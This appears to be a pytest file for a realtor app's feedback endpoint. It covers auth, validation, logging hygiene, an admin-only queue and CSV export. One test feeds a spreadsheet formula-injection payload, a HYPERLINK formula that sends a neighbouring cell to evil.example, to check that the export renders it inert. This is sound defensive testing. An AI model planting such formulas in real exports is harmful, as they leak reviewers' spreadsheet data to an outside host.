"""The feedback endpoint (AUR-59, AUR-60) and what it does NOT store.

Storage is Phase 4; what ships is the route and one log line. So most of these
are about the boundary: attribution, the category set, and what must never
reach the log.
"""

import json
import logging

import pytest
from fastapi.testclient import TestClient

from app.domain import IssueCategory
from tests.fakes import FakeProjectRepo, make_token

TOKEN = make_token("sarath")
AUTH = {"Authorization": f"Bearer {TOKEN}"}

UP = {"answer_id": "a-1", "question": "cheapest project in Brampton?", "verdict": "up"}


def post(app, body, headers=AUTH):
    app.state.container.projects = FakeProjectRepo([])
    with TestClient(app) as client:
        return client.post("/feedback", json=body, headers=headers)


def test_requires_a_token(app):
    assert post(app, UP, headers={}).status_code == 401


def test_a_thumbs_up_is_accepted(app):
    r = post(app, UP)
    assert r.status_code == 200
    assert r.json() == {"ok": True}


def test_a_report_carries_a_category_and_the_projects_it_is_about(app):
    r = post(app, {
        **UP,
        "verdict": "down",
        "category": "deposit_incorrect",
        "note": "sheet says 10%, Aura said 5%",
        "project_ids": ["AK-0002"],
    })
    assert r.status_code == 200


def test_a_data_issue_is_not_forced_to_be_a_thumbs_down(app, caplog):
    """Both exits from the sheet hardcoded verdict='down', so every AUR-60
    report dragged down the AUR-59 helpfulness rate."""
    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        r = post(app, {
            "answer_id": "a-1", "question": "what is the deposit on DUO?",
            "category": "price_incorrect", "note": "sheet says 15%",
        })
    assert r.status_code == 200
    entry = _entry(caplog)
    assert entry["verdict"] is None
    assert entry["category"] == "price_incorrect"


def test_a_note_with_no_category_is_still_a_report(app):
    """Send is enabled by a note as well as a category."""
    assert post(app, {
        "answer_id": "a-1", "question": "q", "note": "occupancy moved to Q3",
    }).status_code == 200


def test_a_report_that_says_nothing_is_refused(app):
    """Making verdict optional opened this: a row that reports nothing."""
    assert post(app, {"answer_id": "a-1", "question": "q"}).status_code == 422
    assert post(app, {"answer_id": "a-1", "question": "q", "note": "   "}).status_code == 422


def test_an_invented_category_is_refused(app):
    """The queue is worked by category, so an undefined one is unsortable."""
    r = post(app, {**UP, "verdict": "down", "category": "vibes_incorrect"})
    assert r.status_code == 422


def test_the_seven_categories_are_exactly_the_ones_aur_60_names(app):
    assert {c.value for c in IssueCategory} == {
        "price_incorrect", "deposit_incorrect", "incentive_outdated",
        "occupancy_incorrect", "missing_project", "source_outdated", "other",
    }


@pytest.mark.parametrize("field,value", [
    ("question", "x" * 501),
    ("note", "x" * 201),
    ("answer_id", "x" * 65),
])
def test_over_length_fields_are_refused(app, field, value):
    """Each lands in a log line, from an authenticated but untrusted client."""
    assert post(app, {**UP, field: value}).status_code == 422


def test_too_many_project_ids_are_refused(app):
    assert post(app, {**UP, "project_ids": [f"p{i}" for i in range(13)]}).status_code == 422


def test_an_oversized_project_id_is_refused(app):
    """`max_length` on a list bounds the count, not the items -- twelve 200kB
    ids were a valid body, 200 OK, and a 2.3MB log line."""
    assert post(app, {**UP, "project_ids": ["X" * 65]}).status_code == 422
    assert post(app, {**UP, "project_ids": ["X" * 64]}).status_code == 200


def test_the_whole_body_cannot_outgrow_one_log_line(app, caplog):
    """The worst line a valid request can produce. The fields were capped one at
    a time and the total was never looked at."""
    import logging

    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        r = post(app, {
            "answer_id": "a" * 64,
            "question": "q" * 500,
            "verdict": "down",
            "category": "other",
            "note": "n" * 200,
            "project_ids": ["p" * 64] * 12,
        })
    assert r.status_code == 200
    line = caplog.records[-1].getMessage()
    assert "\n" not in line
    assert len(line) < 2_500


def test_the_user_comes_from_the_token_not_the_body(app, caplog):
    """A client that could name the user could file as somebody else."""
    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        post(app, {**UP, "user": "someone-else"})
    assert _entry(caplog)["user"] == "sarath"


def test_the_answer_text_never_reaches_the_log(app, caplog):
    """The decision this endpoint is shaped around. The body has no answer
    field, so an attempt to smuggle one must be dropped, not passed through."""
    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        post(app, {**UP, "answer": "Commission is 4.5% on this one"})
    line = caplog.text
    assert "4.5%" not in line and "Commission" not in line
    assert "answer" not in _entry(caplog)


def test_the_token_never_reaches_the_log(app, caplog):
    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        post(app, UP)
    assert TOKEN not in caplog.text


def test_the_log_line_is_one_json_object(app, caplog):
    """Grep-and-replay into Phase 4's table needs one parseable line each."""
    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        post(app, {**UP, "verdict": "down", "category": "price_incorrect"})
    entry = _entry(caplog)
    assert entry["verdict"] == "down"
    assert entry["category"] == "price_incorrect"
    assert entry["answer_id"] == "a-1"
    assert "\n" not in caplog.records[-1].getMessage()


def _entry(caplog) -> dict:
    """The last structured report line.

    Searched rather than taken from the end: the same logger also carries
    warnings (a store that is down), and those are not JSON.
    """
    for record in reversed(caplog.records):
        msg = record.getMessage()
        if msg.startswith("{"):
            return json.loads(msg)
    raise AssertionError("no structured feedback line was logged")


def test_the_log_line_survives_a_real_uvicorn_style_startup(capsys):
    """uvicorn configures only its own loggers, so `aura.*` reached a bare root
    and logging.lastResort dropped it: 200, and the report gone.

    Through stdout rather than caplog on purpose -- caplog attaches a handler,
    which is what hid this.
    """
    import logging as _logging

    from app.config import Settings
    from app.feedback import _record
    from app.main import configure_logging
    from app.main import create_app as _create

    aura = _logging.getLogger("aura")
    saved, level, prop = aura.handlers[:], aura.level, aura.propagate
    for h in saved:
        aura.removeHandler(h)
    try:
        _create(Settings(token_secret="x", _env_file=None))
        _record({"verdict": "up", "user": "sarath"})
        out = capsys.readouterr().out
        assert '"verdict":"up"' in out
        assert "aura.feedback" in out
        configure_logging()  # second call must not add a second handler
        assert len(_logging.getLogger("aura").handlers) == 1
    finally:
        for h in _logging.getLogger("aura").handlers[:]:
            aura.removeHandler(h)
        for h in saved:
            aura.addHandler(h)
        aura.level, aura.propagate = level, prop


def test_the_report_reaches_the_store_and_the_log(app, caplog):
    """Both, not either. The table makes the queue sortable; the log line is
    AUR-20 audit and survives Phase 4."""
    from tests.fakes import FakeConversationStore

    store = FakeConversationStore()
    app.state.container.store = store
    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        r = post(app, {**UP, "verdict": "down", "category": "price_incorrect"})
    assert r.status_code == 200
    assert store.feedback[-1]["category"] == "price_incorrect"
    assert store.feedback[-1]["user_id"] == "sarath"      # from the token, not the body
    assert _entry(caplog)["category"] == "price_incorrect"


def test_a_dead_store_does_not_lose_the_report_or_fail_the_request(app, caplog):
    """The log line already has it. Answering 500 would train realtors to stop
    sending feedback, which costs more than an unsorted queue."""
    from tests.fakes import FakeConversationStore

    store = FakeConversationStore()
    store.up = False
    app.state.container.store = store
    with caplog.at_level(logging.INFO, logger="aura.feedback"):
        r = post(app, UP)
    assert r.status_code == 200
    assert _entry(caplog)["verdict"] == "up"


# ---- AUR-62: the data owner reads the queue without database access --------

def _run(coro):
    import asyncio

    return asyncio.new_event_loop().run_until_complete(coro)


def _admin(app):
    from app.domain import Claims, Role

    app.state.container.auth.claims = Claims(user="admin", role=Role.ADMIN, issued_ms=0)


def _queue(app):
    from tests.fakes import FakeConversationStore

    store = FakeConversationStore()
    app.state.container.store = store
    return store


def test_a_realtor_cannot_read_the_queue(app):
    """Reports name other realtors and quote their questions back. Entitlement
    comes from the verified token, never from the client asking nicely."""
    _queue(app)
    with TestClient(app) as client:
        r = client.get("/feedback", headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.status_code == 403


def test_an_admin_reads_the_queue(app):
    store = _queue(app)
    _run(store.record_feedback(user="sarath", entry={"question": "q", "verdict": "down"}))
    _admin(app)
    with TestClient(app) as client:
        body = client.get("/feedback", headers={"Authorization": f"Bearer {TOKEN}"}).json()
    assert body["feedback"][0]["question"] == "q"


def test_the_csv_is_gated_the_same_way(app):
    """A second route on the same data is a second chance to forget the gate."""
    _queue(app)
    with TestClient(app) as client:
        assert client.get(
            "/feedback.csv", headers={"Authorization": f"Bearer {TOKEN}"}
        ).status_code == 403


def test_the_csv_has_a_fixed_header_and_one_row_per_report(app):
    """Columns that move between exports are columns nobody can build a filter
    on, so the order is declared rather than taken from the first row."""
    store = _queue(app)
    _run(store.record_feedback(user="sarath", entry={
        "question": "why", "verdict": "down", "category": "price_incorrect",
        "note": "stale", "project_ids": ["AK-1", "AK-2"],
    }))
    _admin(app)
    with TestClient(app) as client:
        text = client.get(
            "/feedback.csv", headers={"Authorization": f"Bearer {TOKEN}"}
        ).text
    lines = [l for l in text.splitlines() if l.strip()]
    assert lines[0].startswith("created_at,user_id,verdict,category,question,note,project_ids")
    assert "AK-1 AK-2" in lines[1]


def test_the_csv_downloads_rather_than_renders(app):
    _queue(app)
    _admin(app)
    with TestClient(app) as client:
        r = client.get("/feedback.csv", headers={"Authorization": f"Bearer {TOKEN}"})
    assert r.headers["content-type"].startswith("text/csv")
    assert "attachment" in r.headers["content-disposition"]


def test_no_store_is_a_503_for_the_reviewer_too(app):
    """Not configured is not the same as forbidden, and an admin staring at an
    empty queue should know which one they are looking at."""
    app.state.container.store = None
    _admin(app)
    with TestClient(app) as client:
        assert client.get(
            "/feedback", headers={"Authorization": f"Bearer {TOKEN}"}
        ).status_code == 503


def test_a_note_cannot_become_a_formula_in_the_reviewers_spreadsheet(app):
    """This file exists to be pasted into Sheets, and `note` is realtor-typed.
    Unquoted, `=HYPERLINK("https://evil/?x"&A1,"click")` arrives as a live link
    carrying the neighbouring cell into a URL, and =IMPORTXML needs no click."""
    store = _queue(app)
    _run(store.record_feedback(user="sarath", entry={
        "question": "=1+1", "note": '=HYPERLINK("https://evil.example/?x"&A1,"go")',
        "verdict": "down", "category": "other", "project_ids": ["=cmd"],
    }))
    _admin(app)
    with TestClient(app) as client:
        text = client.get("/feedback.csv", headers={"Authorization": f"Bearer {TOKEN}"}).text
    row = next(l for l in text.splitlines() if "evil.example" in l)
    # Every cell that could lead with a formula character is quoted inert.
    assert "'=HYPERLINK" in row
    assert "'=1+1" in row
    assert "'=cmd" in row
    assert ",=" not in row and not row.startswith("=")


def test_ordinary_text_is_left_alone(app):
    """The guard must not put a stray quote in front of every note."""
    store = _queue(app)
    _run(store.record_feedback(user="sarath", entry={
        "question": "which projects", "note": "price is stale", "verdict": "down",
    }))
    _admin(app)
    with TestClient(app) as client:
        text = client.get("/feedback.csv", headers={"Authorization": f"Bearer {TOKEN}"}).text
    assert "price is stale" in text
    assert "'price" not in text
